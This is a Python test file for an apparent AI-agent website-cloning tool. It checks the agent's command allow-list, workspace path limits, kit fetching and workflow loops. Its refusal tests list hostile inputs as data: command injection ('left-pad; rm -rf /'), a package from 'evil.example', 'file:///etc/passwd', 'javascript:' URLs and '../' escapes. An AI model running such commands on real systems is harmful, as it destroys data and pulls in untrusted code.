"""The site cloner: the kit, the agent's tools, the workflow, the question to the person and the studies.

No test reaches GitHub, npm or a browser: the kit is a folder written here, the checks that would
install packages are replaced, commands are recorded and not run, and the models are scripted.
"""

from __future__ import annotations

import dataclasses
import json
import subprocess
import threading
import time
from pathlib import Path
from typing import Any

import pytest

from agentfit.clone import asking, devserver, proc, prompts, studio, tools
from agentfit.clone.install import BrowserInstall
from agentfit.clone.kits import (
    KIT,
    KitError,
    KitStore,
    has_package,
    host_of,
    host_slug,
    is_cloner_project,
    is_empty,
    strip_frontmatter,
)
from agentfit.clone.session import SessionRegistry
from agentfit.cloud.anthropic_wire import _user_parts
from agentfit.events import EventBus
from agentfit.workflows import checks
from agentfit.workflows import tools as base
from agentfit.workflows.checks import CheckContext
from agentfit.workflows.dsl import WorkflowDef, WorkflowMeta
from agentfit.workflows.runner import RunManager
from agentfit.workflows.tools import Risk, ToolContext, ToolError
from agentfit.workflows.validator import validate
from fakes import FakeRuntime, tool_call

SKILL = ("---\nname: clone-website\ndescription: x\nargument-hint: \"<url>\"\n---\n\n# Clone Website\n\nRebuild **$ARGUMENTS** as a Next.js clone.\n"
         "Ask which pages to clone. Use the browser MCP and Bash.\n")
REPORT = "# Brief\n" + "Header 80 px, hero in two columns, three cards, dark footer. " * 6


def fake_store(root: Path) -> KitStore:
    """The kit as a folder written here and marked ready, so nothing is fetched."""
    store = KitStore(root)
    if store.ready():
        return store
    kit = store.folder()
    (kit / ".claude/skills/clone-website").mkdir(parents=True)
    (kit / ".claude/skills/clone-website/SKILL.md").write_text(SKILL, encoding="utf-8")
    (kit / "scripts/extract").mkdir(parents=True)
    (kit / "scripts/extract/page.mjs").write_text("// page", encoding="utf-8")
    (kit / "scripts/manifest.mjs").write_text("// manifest", encoding="utf-8")
    (kit / "src/app").mkdir(parents=True)
    (kit / "src/app/page.tsx").write_text("export default function Page() { return null }", encoding="utf-8")
    (kit / "package.json").write_text('{"scripts": {"dev": "next dev", "check": "x", "setup": "playwright install chromium"}, "dependencies": {"next": "16"}}', encoding="utf-8")
    (kit / "README.md").write_text("not part of a clone", encoding="utf-8")
    (kit / "Dockerfile").write_text("not part of a clone", encoding="utf-8")
    (kit / "examples").mkdir()
    (kit / "examples/demo.png").write_bytes(b"png")
    (kit / ".kit-ready").write_text("ok", encoding="utf-8")
    return store


# -- small helpers ----------------------------------------------------------------------


def test_host_names_follow_the_kits_scripts():
    assert host_of("https://www.Example.com/a?b=1") == "example.com"
    assert host_of("http://localhost:3000/x") == "localhost"
    assert host_slug("https://sub.my-site.co.uk") == "sub-my-site-co-uk"


@pytest.mark.parametrize("raw, ok", [("example.com", True), ("https://a.b/c", True), ("localhost:3000", True), ("http://localhost:3000", True),
                                      ("hello", False), ("ftp://x.com", False), ("", False)])
def test_addresses(raw, ok):
    if ok:
        assert studio.normalize_url(raw).startswith("http")
    else:
        with pytest.raises(studio.CloneError):
            studio.normalize_url(raw)


def test_a_header_is_removed_from_the_skill():
    assert strip_frontmatter(SKILL).startswith("# Clone Website")
    assert strip_frontmatter("no header") == "no header"


def test_what_makes_a_folder_a_project_of_the_kit(tmp_path):
    assert is_empty(tmp_path) and not has_package(tmp_path) and not is_cloner_project(tmp_path)
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    assert has_package(tmp_path) and not is_cloner_project(tmp_path) and not is_empty(tmp_path)
    store = fake_store(tmp_path / "kits")
    mine = tmp_path / "mine"
    mine.mkdir()
    store.scaffold(mine)
    assert is_cloner_project(mine)


def test_windows_batch_files_go_through_cmd_with_the_extra_quotes():
    line = proc.command([r"C:\Program Files\nodejs\npm.cmd", "install", r"D:\Will It Run\x"])
    assert isinstance(line, str) and line.startswith('"') and "/d /s /c" in line and line.endswith('"')
    assert proc.command(["node", "a.js"]) == ["node", "a.js"]
    assert proc.at_least("v24.18.0", (22, 0)) and not proc.at_least("v20.8.0", (22, 0)) and proc.at_least("nonsense", (1, 0)) is None


def test_a_folder_is_spelled_in_its_long_true_form_before_a_command_starts_in_it(tmp_path, monkeypatch):
    seen: dict[str, Any] = {}

    class Done:
        stdout = iter([])
        returncode = 0

        def poll(self):
            return 0

    def popen(argv, **kw):
        seen.update(kw)
        return Done()

    monkeypatch.setattr(proc.subprocess, "Popen", popen)
    folder = tmp_path / "Will It Run"
    folder.mkdir()
    proc.spawn_command(["node", "-v"], folder)
    assert seen["cwd"] == str(proc.resolve_true_case(folder)) and " " in seen["cwd"]


# -- the kit ------------------------------------------------------------------------------


def git_that_serves(commit: str, calls: list[list[str]]):
    def run(args: list[str], cwd: Path | None, timeout: float) -> subprocess.CompletedProcess[str]:
        calls.append(args)
        out = commit + "\n" if args[:2] == ["rev-parse", "HEAD"] else ""
        return subprocess.CompletedProcess(args, 0, out, "")

    return run


def test_the_kit_is_fetched_at_its_pinned_commit_and_only_once(tmp_path):
    calls: list[list[str]] = []
    store = KitStore(tmp_path, git=git_that_serves(KIT.commit, calls))
    folder = store.ensure()
    assert (folder / ".kit-ready").read_text(encoding="utf-8").strip() == KIT.commit
    fetch = next(c for c in calls if "fetch" in c)
    assert KIT.commit in fetch and "--depth" in fetch and KIT.repo + ".git" in next(c for c in calls if "remote" in c)
    before = len(calls)
    store.ensure()
    assert len(calls) == before and store.ready()


def test_a_kit_that_comes_back_as_another_commit_is_not_used(tmp_path):
    store = KitStore(tmp_path, git=git_that_serves("0" * 40, []))
    with pytest.raises(KitError, match="not the pinned"):
        store.ensure()
    assert not store.ready() and not store.folder().exists()


def test_a_failed_fetch_leaves_nothing_behind_and_says_why(tmp_path):
    def broken(args, cwd, timeout):
        return subprocess.CompletedProcess(args, 128, "", "fatal: unable to access 'https://github.com/': Could not resolve host")

    store = KitStore(tmp_path, git=broken)
    with pytest.raises(KitError, match="Could not resolve host"):
        store.ensure()
    assert not store.folder().exists()


def test_the_kit_is_the_one_the_person_used_in_opencode():
    assert KIT.repo == "https://github.com/Mahanaicoach/ai-site-cloner" and KIT.license == "MIT" and len(KIT.commit) == 40


def test_the_scaffold_copies_the_project_but_never_over_a_file_that_is_there(tmp_path):
    store = fake_store(tmp_path / "kits")
    target = tmp_path / "project"
    (target / "src/app").mkdir(parents=True)
    (target / "src/app/page.tsx").write_text("MINE", encoding="utf-8")
    copied = store.scaffold(target)
    assert (target / "src/app/page.tsx").read_text(encoding="utf-8") == "MINE"
    assert "package.json" in copied and "src/app/page.tsx" not in copied and "scripts/extract/page.mjs" in copied
    assert ".claude/skills/clone-website/SKILL.md" in copied
    # What belongs to the repository and not to a clone stays out.
    assert not (target / "README.md").exists() and not (target / "Dockerfile").exists() and not (target / "examples").exists()
    assert (target / "docs/research").is_dir()


# -- what the agent is told ------------------------------------------------------------------


def test_the_skill_is_given_as_written_with_its_arguments_in_and_the_apps_tool_names_after_it(tmp_path):
    store = fake_store(tmp_path)
    text = prompts.skill_prompt(store, url="https://www.example.com/", host="example.com", sees=True, extra="only the home page")
    assert "Rebuild **https://www.example.com/ only the home page** as a Next.js clone." in text and "$ARGUMENTS" not in text
    assert "Ask which pages to clone." in text and text.index("# Clone Website") < text.index("## How this app runs the skill")
    assert "`run_command`" in text and "`ask_user`" in text and "`preview_start`" in text and "docs/research/example.com/" in text
    assert "`look`" in text and "{url}" not in text and "{host}" not in text and "{sight}" not in text
    blind = prompts.skill_prompt(store, url="https://example.com", host="example.com", sees=False)
    assert "No model that can see" in blind and "diff.mjs" in blind


# -- the workflow -------------------------------------------------------------------------------


@pytest.mark.parametrize("sees, vision_key", [(True, ""), (False, "vision-model"), (False, "")])
def test_the_workflow_is_valid_whatever_can_see(tmp_path, sees, vision_key):
    definition = studio.definition(store=fake_store(tmp_path), url="https://example.com", model_key="m", sees=sees, vision_key=vision_key)
    assert validate(definition, require_models=True).ok and definition.workflow.category == "clone"
    (cloner,) = definition.agents
    assert ("look" in cloner.tools) == bool(sees or vision_key)
    assert all(name in base.TOOLS for name in cloner.tools)
    assert ("vision" in definition.models) == bool(vision_key and not sees)
    assert {c.id for c in definition.checks} == {"prepare", "final"}


def test_the_agent_has_the_tools_the_skill_needs_and_no_more(tmp_path):
    definition = studio.definition(store=fake_store(tmp_path), url="https://example.com", model_key="m", sees=False)
    cloner = definition.agents[0]
    for needed in ("run_command", "json_outline", "preview_start", "preview_stop", "ask_user", "read_file", "write_file", "edit_file", "list_dir", "browser_navigate"):
        assert needed in cloner.tools
    assert "powershell" not in cloner.tools and "run_python" not in cloner.tools and "compare_pages" not in base.TOOLS
    # A whole site is a long conversation, and a fix afterwards is a short one.
    # A pass is short and starts from the manifest; the final check sends the work back while it moves.
    assert 100 <= cloner.max_tool_rounds <= 200 and cloner.idle_watches_workspace
    # Reading in a loop with nothing written takes its reading tools away; near-greedy decoding is how it loops.
    assert 16 <= cloner.focus_after_idle_rounds <= 30 and cloner.temperature >= 0.5
    assert "src/app/layout.tsx" in cloner.focus_hint and "globals.css" in cloner.focus_hint and "src/components/sites/" in cloner.focus_hint
    (back,) = [e for e in definition.edges if e.source == "final" and e.target == "cloner"]
    assert back.when == "should_continue == true" and back.max_loops == studio.FIX_ROUNDS >= 4
    assert "Rebuild **https://example.com**" in cloner.system_prompt


# -- the tools ----------------------------------------------------------------------------------


def context(tmp_path: Path, **kw: Any) -> ToolContext:
    return ToolContext(workspace=tmp_path, **kw)


class FakeInstall:
    def node_exe(self):
        return "C:/nodejs/node.exe"

    def npm_exe(self):
        return "C:/nodejs/npm.cmd"


class FakeSession:
    install = FakeInstall()

    def __init__(self, host=None, answers=None):
        self._host, self.asked, self._answers = host, [], answers or ["Only the home page"]
        self.dev_calls: list[bool] = []

    def browser(self):
        return self._host

    def ask(self, question, options):
        self.asked.append((question, options))
        return self._answers.pop(0)


def test_the_browser_tools_say_plainly_when_there_is_no_browser(tmp_path):
    with pytest.raises(ToolError, match="no browser"):
        base.execute("browser_navigate", {"url": "https://example.com"}, context(tmp_path))


@pytest.mark.parametrize("url", ["file:///etc/passwd", "javascript:alert(1)", "", "ftp://x.com"])
def test_only_http_addresses_open(tmp_path, url):
    calls: list[Any] = []

    class Host:
        def call(self, *a, **k):
            calls.append(a)
            return {}

    with pytest.raises(ToolError):
        base.execute("browser_navigate", {"url": url}, context(tmp_path, clone=lambda: FakeSession(Host())))
    assert not calls


def test_navigate_says_what_a_403_is(tmp_path):
    class Host:
        def call(self, cmd, args=None, timeout=0):
            return {"url": "https://www.example.com/", "status": 403, "ms": 90, "title": "Access Denied", "width": 1440, "height": 400}

    text = base.execute("browser_navigate", {"url": "https://www.example.com/"}, context(tmp_path, clone=lambda: FakeSession(Host())))
    assert "HTTP 403 is an error page" in text and "refuses automated browsers" in text


def test_screenshots_and_downloads_stay_inside_the_workspace(tmp_path):
    sent: list[tuple[str, dict]] = []

    class Host:
        def call(self, cmd, args=None, timeout=0):
            sent.append((cmd, args or {}))
            return {"width": 10, "height": 20, "bytes": 2048, "mime": "image/png"}

    ctx = context(tmp_path, clone=lambda: FakeSession(Host()))
    assert "docs/design-references/hero.png" in base.execute("browser_take_screenshot", {"filename": "hero.png"}, ctx).replace("\\", "/")
    assert "docs/design-references/127-0-0-1/home.png" in base.execute("browser_take_screenshot", {"filename": "127-0-0-1/home.png"}, ctx).replace("\\", "/")
    assert "docs/research/x.png" in base.execute("browser_take_screenshot", {"filename": "docs/research/x.png"}, ctx).replace("\\", "/")
    with pytest.raises(ToolError, match="outside the workspace"):
        base.execute("browser_take_screenshot", {"filename": "../../../escape.png"}, ctx)
    with pytest.raises(ToolError, match="outside the workspace"):
        base.execute("download_asset", {"url": "https://example.com/a.png", "path": "../../a.png"}, ctx)
    assert "Saved public/images/a.png" in base.execute("download_asset", {"url": "https://example.com/a.jpg", "path": "public/images/a.png"}, ctx).replace("\\", "/")


def test_write_file_does_not_make_folders_out_of_empty_files_and_explains_a_file_in_the_way(tmp_path):
    ctx = context(tmp_path)
    for bad in ({"path": "src/components/sites/example-com", "content": ""}, {"path": "src/components/sites/example-com/", "content": "x"}):
        with pytest.raises(ToolError, match="Folders are made by themselves"):
            base.execute("write_file", bad, ctx)
    assert not (tmp_path / "src").exists()
    (tmp_path / "blocker").write_text("", encoding="utf-8")
    with pytest.raises(ToolError, match="blocker is a file, not a folder"):
        base.execute("write_file", {"path": "blocker/Header.tsx", "content": "export const H = 1"}, ctx)
    assert base.execute("write_file", {"path": "src/__init__.py", "content": ""}, ctx).startswith("Wrote 0 characters")


def test_look_needs_a_model_that_sees_and_sends_the_picture_to_it(tmp_path):
    (tmp_path / "shot.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 8 + (1440).to_bytes(4, "big") + (800).to_bytes(4, "big") + b"data")
    with pytest.raises(ToolError, match="No model that can see"):
        base.execute("look", {"path": "shot.png"}, context(tmp_path))
    seen: dict[str, Any] = {}

    def complete(slot, messages, **options):
        seen.update(slot=slot, messages=messages, options=options)
        return {"choices": [{"message": {"content": "<think>hm</think>A dark hero, 80 px tall."}}]}

    ctx = context(tmp_path, complete=complete, vision_slot="vision")
    assert base.execute("look", {"path": "shot.png", "question": "How tall is the header?"}, ctx) == "A dark hero, 80 px tall."
    parts = seen["messages"][1]["content"]
    assert seen["slot"] == "vision" and parts[0]["text"] == "How tall is the header?"
    assert parts[1]["image_url"]["url"].startswith("data:image/png;base64,")
    with pytest.raises(ToolError, match="File not found"):
        base.execute("look", {"path": "nope.png"}, ctx)


def test_pictures_in_a_message_become_anthropic_image_blocks():
    parts = _user_parts([{"type": "text", "text": "what is this"}, {"type": "image_url", "image_url": {"url": "data:image/png;base64,AAAA"}},
                         {"type": "image_url", "image_url": {"url": "https://example.com/not-embedded.png"}}])
    assert parts == [{"type": "text", "text": "what is this"}, {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "AAAA"}}]
    assert _user_parts("plain") == [{"type": "text", "text": "plain"}] and _user_parts("  ") == []


# -- run_command: what the skill's Bash is here --------------------------------------------------


@pytest.fixture
def project(tmp_path):
    (tmp_path / "scripts/extract").mkdir(parents=True)
    (tmp_path / "scripts/extract/page.mjs").write_text("// page", encoding="utf-8")
    (tmp_path / "package.json").write_text('{"scripts": {"build": "next build", "check": "x", "dev": "next dev", "start": "next start", "lint": "eslint"}}', encoding="utf-8")
    (tmp_path / "node_modules").mkdir()
    return tmp_path


@pytest.fixture
def ran(monkeypatch):
    """Commands are recorded, never run."""
    calls: list[list[str]] = []

    def fake(argv, cwd, **kw):
        calls.append(argv)
        return (0, [f"ran {' '.join(argv[1:3])}"], False)

    monkeypatch.setattr(tools.proc, "run_streaming", fake)
    return calls


def run(project, command, **extra):
    return base.execute("run_command", {"command": command, **extra}, ToolContext(workspace=project, clone=lambda: FakeSession()))


def test_the_kits_scripts_and_the_projects_scripts_run_with_the_programs_found_on_this_pc(project, ran):
    out = run(project, 'node scripts/extract/page.mjs "https://www.example.com/?a=1&b=2" --no-site-files')
    assert out.startswith("exit code 0") and "$ node scripts/extract/page.mjs" in out
    assert ran[-1][0] == "C:/nodejs/node.exe" and ran[-1][1] == "scripts/extract/page.mjs" and ran[-1][2] == "https://www.example.com/?a=1&b=2"
    run(project, "npm run build")
    assert ran[-1][0] == "C:/nodejs/npm.cmd" and ran[-1][1:] == ["run", "build"]
    run(project, "npx tsc --noEmit")
    assert ran[-1][1] == "--no-install" and "tsc" in ran[-1]  # a program the project does not have is never downloaded
    run(project, "git log --oneline")


def test_commands_joined_with_and_run_in_order_and_stop_at_the_first_failure(project, monkeypatch):
    calls: list[list[str]] = []

    def fake(argv, cwd, **kw):
        calls.append(argv)
        return (2, ["boom"], False) if "lint" in argv else (0, ["ok"], False)

    monkeypatch.setattr(tools.proc, "run_streaming", fake)
    out = run(project, "npm run build && npm run lint # then typecheck\nnpm run check")
    assert [c[2] for c in calls] == ["build", "lint"] and out.startswith("exit code 2") and "boom" in out


def test_what_is_not_a_command_of_the_kit_is_refused_with_what_to_do_instead(project, ran):
    for command, why in [
        ("node -e 'process.exit()'", "runs a script of the project"),
        ("node ../outside.mjs", "outside the workspace"),
        ("node scripts/missing.mjs", "not a script of the project"),
        ("npm start", "preview_start"),
        ("npm run dev", "preview_start"),
        ("npm run nope", 'no "nope" script'),
        ("npm publish", "npm is available for"),
        ("npx create-next-app", "npx is available for"),
        ("npx playwright test", "playwright install"),
        ("git push", "read-only"),
        ("git diff --output=out.txt", "cannot write to a file"),
        ("git branch feature", "only lists"),
        ("npx --package=evil tsc", "npx is available for"),
        ("npm install --prefix ../elsewhere", "takes only these options"),
        ("npm ci --registry=http://x", "takes only these options"),
        ("mkdir -p docs/research", "write_file"),
        ("cat docs/x.md", "read_file"),
        ("curl https://example.com", "not available"),
        ("powershell -c dir", "not available"),
        ("node scripts/extract/page.mjs https://x.com | head", "Shell syntax"),
        ("node scripts/extract/page.mjs https://x.com > out.txt", "Shell syntax"),
        ("node scripts/extract/page.mjs https://x.com?a=1&b=2", "Shell syntax"),
        ("echo $HOME", "Shell syntax"),
        ("node scripts/extract/page.mjs 'https://x.com", "quote is not closed"),
        ("", "Give a command"),
    ]:
        with pytest.raises(ToolError, match=why):
            run(project, command)
    assert not ran


def test_packages_are_checked_and_adding_one_asks_first(project, ran):
    for bad in ("left-pad; rm -rf /", "https://evil.example/x.tgz", "--registry=http://x"):
        with pytest.raises(ToolError):
            run(project, f"npm install {bad}")
    with pytest.raises(ToolError, match="at most 8"):
        run(project, "npm install " + " ".join(f"p{i}" for i in range(9)))
    ctx = ToolContext(workspace=project)
    assert base.classify("run_command", {"command": "npm install motion"}, ctx)[0] == Risk.HIGH
    assert base.classify("run_command", {"command": "npm install"}, ctx)[0] == Risk.MEDIUM
    assert base.classify("run_command", {"command": "node scripts/extract/page.mjs https://x.com"}, ctx)[0] == Risk.MEDIUM
    assert base.classify("run_command", {"command": "git status && git diff"}, ctx)[0] == Risk.LOW
    assert base.classify("run_command", {"command": "echo $HOME"}, ctx)[0] == Risk.MEDIUM


def test_a_long_output_keeps_its_start_and_its_end(project, monkeypatch):
    monkeypatch.setattr(tools.proc, "run_streaming", lambda argv, cwd, **kw: (1, [f"line {i}" for i in range(4000)] + ["error TS2304 at the end"], False))
    out = run(project, "npm run build")
    assert len(out) < 13_000 and "characters cut" in out and "line 0" in out and out.endswith("error TS2304 at the end")


def test_a_command_that_runs_out_of_time_or_is_stopped_says_so(project, monkeypatch):
    monkeypatch.setattr(tools.proc, "run_streaming", lambda argv, cwd, **kw: (-1, ["partial"], True))
    with pytest.raises(ToolError, match="did not finish within 10 s"):
        run(project, "npm run build", timeout_seconds=1)  # the shortest allowed is 10 s

    def stopped(argv, cwd, **kw):
        raise proc.Cancelled()

    monkeypatch.setattr(tools.proc, "run_streaming", stopped)
    with pytest.raises(ToolError, match="Stopped"):
        run(project, "npm run build")


# -- ask_user: the skill's question to the person -------------------------------------------------


def test_the_agent_asks_the_person_and_gets_their_answer_back(project):
    session = FakeSession(answers=["Home page + 2 more pages"])
    out = base.execute("ask_user", {"question": "I found 8 pages. Which do you want?", "options": ["Only the home page", "Home page + 2 more pages"]},
                       ToolContext(workspace=project, clone=lambda: session))
    assert out == "The person answered: Home page + 2 more pages"
    assert session.asked == [("I found 8 pages. Which do you want?", ["Only the home page", "Home page + 2 more pages"])]
    with pytest.raises(ToolError, match="Write the question"):
        base.execute("ask_user", {"question": " "}, ToolContext(workspace=project, clone=lambda: session))


def test_a_question_waits_for_the_answer_and_is_visible_while_it_waits():
    events: list[tuple[str, dict]] = []
    got: list[str] = []
    thread = threading.Thread(target=lambda: got.append(asking.ask("r1", "Which pages?", ["Home", "Two pages", ""], emit=lambda t, p: events.append((t, p)),
                                                                     cancelled=lambda: False)))
    thread.start()
    for _ in range(100):
        if asking.pending("r1"):
            break
        time.sleep(0.02)
    assert asking.pending("r1") == {"question": "Which pages?", "options": ["Home", "Two pages"]}
    assert asking.answer("r2", "x") is False and asking.answer("r1", "  ") is False
    assert asking.answer("r1", " Two pages ") is True
    thread.join(5)
    assert got == ["Two pages"] and asking.pending("r1") is None
    assert [e[1]["state"] for e in events] == ["waiting", "answered"] and events[0][0] == "clone.ask"


def test_a_question_ends_when_the_run_is_stopped():
    stop = {"now": False}
    errors: list[Exception] = []

    def go():
        try:
            asking.ask("r3", "Which pages?", [], emit=lambda t, p: None, cancelled=lambda: stop["now"])
        except asking.Stopped as exc:
            errors.append(exc)

    thread = threading.Thread(target=go)
    thread.start()
    time.sleep(0.1)
    stop["now"] = True
    thread.join(5)
    assert errors and asking.pending("r3") is None


# -- the app and its dev server ---------------------------------------------------------------------


def test_the_dev_server_gets_the_flags_of_the_project(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"dev": "x", "start": "y"}, "dependencies": {"next": "16"}}', encoding="utf-8")
    assert devserver._flags(tmp_path, 3111) == ["-p", "3111", "-H", "127.0.0.1"]
    assert devserver._flags(tmp_path, 3111, script="start") == ["-p", "3111", "-H", "127.0.0.1"]
    (tmp_path / "package.json").write_text('{"scripts": {"dev": "x", "start": "y"}, "devDependencies": {"vite": "7"}}', encoding="utf-8")
    assert "--strictPort" in devserver._flags(tmp_path, 3111)
    with pytest.raises(devserver.DevServerError, match=r"Only a Next\.js project"):
        devserver._flags(tmp_path, 3111, script="start")
    (tmp_path / "package.json").write_text('{"scripts": {"build": "x"}, "dependencies": {"next": "16"}}', encoding="utf-8")
    with pytest.raises(devserver.DevServerError, match='no "dev" script'):
        devserver._flags(tmp_path, 1)
    with pytest.raises(devserver.DevServerError, match="packages are not installed"):
        devserver.DevServer(tmp_path, "npm").start()


def test_the_production_server_builds_first_and_a_failed_build_is_not_served(tmp_path, monkeypatch):
    (tmp_path / "package.json").write_text('{"scripts": {"dev": "x", "build": "y", "start": "z"}, "dependencies": {"next": "16"}}', encoding="utf-8")
    (tmp_path / "node_modules").mkdir()
    steps: list[list[str]] = []

    def fake_stream(argv, cwd, **kw):
        steps.append(argv)
        return (1, ["Type error: nope"], False)

    monkeypatch.setattr(devserver.proc, "run_streaming", fake_stream)
    server = devserver.DevServer(tmp_path, "npm")
    with pytest.raises(devserver.DevServerError, match=r"(?s)build failed.*Type error: nope"):
        server.start(production=True)
    assert steps == [["npm", "run", "build"]] and server.production is True


def test_preview_start_switches_between_the_two_ways_of_serving(tmp_path):
    class Dev:
        def __init__(self):
            self.running, self.production, self.started = False, False, []

        def stop(self):
            self.running = False

        def start(self, cancelled=None, production=False):
            self.running, self.production = True, production
            self.started.append(production)
            return "http://127.0.0.1:5000"

    dev = Dev()
    session = FakeSession()
    session.dev = lambda: dev
    ctx = context(tmp_path, clone=lambda: session)
    assert "npm run dev" in base.execute("preview_start", {}, ctx)
    out = base.execute("preview_start", {"production": True}, ctx)
    assert "production build" in out and dev.started == [False, True]


# -- the browser engine -------------------------------------------------------------------------------


def test_the_engine_is_installed_with_npm_into_its_own_folder_and_reports_progress(tmp_path):
    engine = tmp_path / "engine"

    class Process:
        stdout = iter(["added 1 package\n"])

        def wait(self):
            package = engine / "node_modules" / "playwright-core"
            package.mkdir(parents=True)
            (package / "package.json").write_text('{"version": "1.58.2"}', encoding="utf-8")
            return 0

    spawned: list[list[str]] = []

    def spawn(argv, cwd):
        spawned.append(argv)
        return Process()

    install = BrowserInstall(engine, which=lambda name: {"node": "C:/node.exe", "npm": "C:/npm.cmd"}.get(name), run=lambda argv, t: (0, "v24.18.0\n"), spawn=spawn,
                             bus=EventBus())
    assert install.status()["installed"] is False and install.node()["ok"]
    install.install()
    for _ in range(100):
        job = install.status()["job"]
        if job and job["state"] != "running":
            break
        time.sleep(0.05)
    assert install.status()["job"]["state"] == "done" and install.installed_version() == "1.58.2"
    assert spawned[0][1:3] == ["install", "--prefix"] and "playwright-core@1.58.2" in spawned[0]


def test_an_old_node_is_refused_with_what_to_do(tmp_path):
    install = BrowserInstall(tmp_path, which=lambda name: "C:/node.exe", run=lambda argv, t: (0, "v20.2.0\n"), bus=EventBus())
    node = install.node()
    assert node["ok"] is False and "too old" in node["detail"] and "22" in node["detail"]
    with pytest.raises(Exception, match="too old"):
        install.install()


# -- the workflow runs --------------------------------------------------------------------------------------


def fake_checks(monkeypatch, builds: list[bool], scaffolded: int = 28):
    """The preparation passes and the final check answers from ``builds``, in order (the last one repeats)."""
    seen: list[str] = []
    failures = {"n": 0}

    def prepare(check, ctx):
        seen.append("prepare")
        (ctx.workspace / "package.json").write_text('{"scripts": {"check": "x"}}', encoding="utf-8")
        return {"passed": True, "scaffolded": scaffolded, "summary": "ready"}

    def build(check, ctx):
        ok = builds.pop(0) if len(builds) > 1 else builds[0]
        seen.append(f"{check.id}:{'ok' if ok else 'fail'}")
        failures["n"] += 0 if ok else 1
        # The real check sends the work back only while it moved: here the first failure did, the next one did not.
        return {"passed": ok, "built": ok, "summary": "npm run check passed." if ok else "npm run check failed (exit code 1).",
                "log": [] if ok else ["error TS2304: Cannot find name 'x'"], "should_continue": not ok and failures["n"] <= 1}

    monkeypatch.setitem(checks.CHECKS, "clone_prepare", dataclasses.replace(checks.CHECKS["clone_prepare"], run=prepare))
    monkeypatch.setitem(checks.CHECKS, "clone_build", dataclasses.replace(checks.CHECKS["clone_build"], run=build))
    return seen


def start_clone(db, tmp_path, runtime, registry=None, **kw):
    manager = RunManager(db, runtime, bus=EventBus(), checkpoint_path=":memory:", **({"clone_session": registry.session} if registry else {}))
    definition = studio.definition(store=fake_store(tmp_path / "kits"), url="https://example.com", model_key="m", sees=kw.get("sees", False))
    record = manager.start(definition, "Clone this website: https://example.com", workspace=str(tmp_path / "ws"), background=kw.get("background", False))
    return manager, record


def test_a_failed_final_check_sends_the_work_back_to_the_agent_with_the_log(db, tmp_path, monkeypatch):
    seen = fake_checks(monkeypatch, [False, True])
    runtime = FakeRuntime({"Cloner": [tool_call("write_file", path="src/components/sites/example.com/Hero.tsx", content="export const Hero = () => null"),
                                      "Cloned the home page; the report follows."]})
    _, record = start_clone(db, tmp_path, runtime)
    assert record.status == "completed", record.error
    assert record.result["history"] == ["prepare", "cloner", "final", "cloner", "final"] and seen == ["prepare", "final:fail", "final:ok"]
    assert (tmp_path / "ws/src/components/sites/example.com/Hero.tsx").is_file()
    second = [c for c in runtime.calls if c["role"] == "Cloner"][-1]
    assert "error TS2304" in second["messages"][1]["content"] and "Feedback to address" in second["messages"][1]["content"]
    first = next(c for c in runtime.calls if c["role"] == "Cloner")
    assert "# Clone Website" in first["messages"][0]["content"] and "Rebuild **https://example.com**" in first["messages"][0]["content"]


def test_a_final_check_that_never_passes_ends_the_run_blocked_with_the_reason(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [False])
    runtime = FakeRuntime({"Cloner": ["did what it could"]})
    _, record = start_clone(db, tmp_path, runtime)
    assert record.result["history"] == ["prepare", "cloner", "final", "cloner", "final"] and record.status == "blocked"
    assert "npm run check failed" in record.error


def test_a_preparation_that_fails_stops_the_run_with_its_reason(db, tmp_path, monkeypatch):
    monkeypatch.setitem(checks.CHECKS, "clone_prepare", dataclasses.replace(
        checks.CHECKS["clone_prepare"], run=lambda check, ctx: {"passed": False, "verdict": "NOT_READY", "summary": "Git is not installed on this PC."}))
    runtime = FakeRuntime({})
    _, record = start_clone(db, tmp_path, runtime)
    assert record.status == "blocked" and record.error == "Git is not installed on this PC." and not runtime.calls


def test_the_agent_can_ask_which_pages_and_the_answer_reaches_its_next_turn(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [True])
    install = BrowserInstall(tmp_path / "engine", which=lambda name: None, bus=EventBus())
    registry = SessionRegistry(install)
    runtime = FakeRuntime({"Cloner": [tool_call("ask_user", question="I found 6 pages. Which do you want?", options=["Only the home page", "Home page + 2 more pages"]),
                                      "Cloning the home page and two more."]})
    manager, record = start_clone(db, tmp_path, runtime, registry, background=True)
    for _ in range(200):
        if asking.pending(record.id):
            break
        time.sleep(0.05)
    waiting = asking.pending(record.id)
    assert waiting == {"question": "I found 6 pages. Which do you want?", "options": ["Only the home page", "Home page + 2 more pages"]}
    assert any(e["type"] == "clone.ask" and e["payload"]["state"] == "waiting" for e in manager.events(record.id))
    assert manager.get(record.id).status == "running"
    assert asking.answer(record.id, "Home page + 2 more pages")
    manager.wait(record.id, 30)
    done = manager.get(record.id)
    assert done.status == "completed", done.error
    assert any(e["type"] == "clone.ask" and e["payload"].get("answer") == "Home page + 2 more pages" for e in manager.events(record.id))
    answered = [c for c in runtime.calls if c["role"] == "Cloner"][-1]
    assert "The person answered: Home page + 2 more pages" in json.dumps(answered["messages"])


def test_the_cloning_run_has_no_project_memory(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [True])
    from agentfit.brain import BrainService

    class Spy(BrainService):
        def __init__(self):
            pass

        def ensure_project(self, source, workspace):
            raise AssertionError("no project for a clone")

        def enabled(self):
            return True

    manager = RunManager(db, FakeRuntime({"*": ["ok"]}), bus=EventBus(), checkpoint_path=":memory:", brain=Spy())
    definition = studio.definition(store=fake_store(tmp_path / "kits"), url="https://example.com", model_key="m", sees=False)
    record = manager.start(definition, "Clone this website: https://example.com", workspace=str(tmp_path / "ws"), background=False,
                           source={"kind": "folder", "path": str(tmp_path)})
    assert record.status == "completed", record.error


# -- the final check ------------------------------------------------------------------------------------------


@pytest.fixture
def passing_npm(tmp_path, monkeypatch):
    class Install:
        def npm_exe(self):
            return "npm"

    monkeypatch.setattr(studio, "install_source", lambda: Install())
    monkeypatch.setattr(studio, "kit_store", fake_store(tmp_path / "kits"))
    monkeypatch.setattr(studio.proc, "run_streaming", lambda argv, cwd, **kw: (0, ["ok"], False))
    project = tmp_path / "project"
    (project / "src/app").mkdir(parents=True)
    (project / "package.json").write_text('{"scripts": {"check": "x"}}', encoding="utf-8")
    (project / "src/app/page.tsx").write_text("export default function Page() { return null }", encoding="utf-8")  # the kit's own
    return project


